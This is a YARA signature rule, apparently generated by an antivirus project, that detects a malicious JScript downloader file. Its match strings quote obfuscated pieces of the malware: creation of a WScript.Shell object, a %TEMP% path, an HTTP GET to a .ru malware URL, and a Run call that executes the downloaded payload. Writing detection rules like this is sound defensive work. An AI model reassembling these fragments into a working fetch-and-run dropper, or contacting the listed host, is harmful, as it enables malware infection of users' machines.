rule sig_20160427_0bd9e022200a80ebab387068c1d31adb {
  meta:
    description = "datamaliciousorder - file 20160427_0bd9e022200a80ebab387068c1d31adb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f2f2009ebf69ae999c5e689b06c6c30732d51054a094a938cd2481aba163e5d3"

  strings:
    $s1  = "function QtqbpIjgml() {return FwofmMdwtu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4onMLhJ" ascii
    $s2  = "function QtqbpIjgml() {return FwofmMdwtu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"4onMLhJ" ascii
    $s3  = "var FwofmMdwtu = function CgreoCgjmp() {return CqqzyLxepa[ChzraTbdyx](\"WScript\"+\".Shell\");}(), BozrcKrigb = 11;" fullword ascii
    $s4  = "function DelayPhvfu(PrmcgKmddp, ZzvjgMzijp){CvjdtPmrqu = CvjdtPmrqu * 1; return PrmcgKmddp - ZzvjgMzijp;};" fullword ascii
    $s5  = "TpbqfIgzos[IclmgLewov](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var CqqzyLxepa = this[\"WScript\"];" fullword ascii
    $s7  = "if (TpbqfIgzos[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function AsmnbTpsgx(){return BbbwsLfgyo + \"\";};" fullword ascii
    $s9  = "function AomvyLzniq() {return ((WarieGldhp == true) && (WarieGldhp == AhemoEmqta)) ? 1 : CvjdtPmrqu;};" fullword ascii
    $s10 = "AhemoEmqta = true; " fullword ascii
    $s11 = "function DhlcbIjtwm(WftooPiwaz) {var MgjpiJevrw = (1, 2, 3, 4, 5, WftooPiwaz); return MgjpiJevrw;};" fullword ascii
    $s12 = "WarieGldhp = true; " fullword ascii
    $s13 = "function TikobLcpww(){return ChzraTbdyx;};" fullword ascii
    $s14 = "function MssdxZxydy(XyiyzIjdlc){FwofmMdwtu[\"R\"+\"un\"](XyiyzIjdlc, CvjdtPmrqu, CvjdtPmrqu);};" fullword ascii
    $s15 = "return DelayPhvfu(VxmjzAvzvb, SbyuuRyebv);" fullword ascii
    $s16 = "var KkxviLtgno = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "BhhdrYcjtb = true;" fullword ascii
    $s18 = "var BhhdrYcjtb = false;" fullword ascii
    $s19 = "function DsvmgLszyn()" fullword ascii
    $s20 = "}while (LjxenSnaer);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}